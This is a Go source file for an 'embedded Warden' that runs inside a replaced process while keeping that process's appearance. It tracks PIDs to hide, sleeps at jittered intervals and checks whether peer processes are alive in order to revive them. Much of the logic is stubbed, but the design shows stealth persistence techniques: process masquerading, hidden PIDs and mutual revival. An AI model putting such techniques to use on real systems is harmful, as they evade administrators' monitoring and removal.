// Package masq provides embedded Warden functionality for running inside
// a replaced process. This code executes silently in the background while
// maintaining the appearance of the original process.
package masq

import (
	"fmt"
	"os"
	"time"

	"warden/internal/audit"
)

// EmbeddedWarden runs Warden logic within a replaced process
type EmbeddedWarden struct {
	target      TargetProcess
	hidePids    []int
	interval    time.Duration
	jitterRange time.Duration
}

// NewEmbedded creates an embedded Warden instance
func NewEmbedded(target TargetProcess, hidePids []int) *EmbeddedWarden {
	return &EmbeddedWarden{
		target:      target,
		hidePids:    hidePids,
		interval:    time.Minute * 2,
		jitterRange: time.Second * 30,
	}
}

// Run starts the embedded Warden loop
func (e *EmbeddedWarden) Run() error {
	fmt.Printf("Embedded Warden running inside %s\n", e.target.Description)

	// Set masquerade environment variable
	os.Setenv("WARDEN_MASQUERADE", "1")

	// Main loop: perform checks at randomized intervals
	for {
		time.Sleep(e.interval + time.Duration(time.Now().UnixNano()%int64(e.jitterRange)))

		// Perform sentinel-style checks here
		e.performChecks()
	}
}

func (e *EmbeddedWarden) performChecks() {
	// Log that we're running a check (to audit log, not stdout)
	log, err := audit.New("/var/log/warden/embedded.log")
	if err != nil {
		return
	}
	defer log.Close()

	_ = log.Log("masq", "check", map[string]any{"target": e.target.Description})

	// Check peer processes and revive if needed
	e.checkPeers(log)
}

func (e *EmbeddedWarden) checkPeers(log *audit.Logger) {
	for _, pid := range e.hidePids {
		if !IsProcessRunning(pid) {
			_ = log.Log("masq", "peer-dead", map[string]any{"pid": pid})
			// Revive logic here
		}
	}
}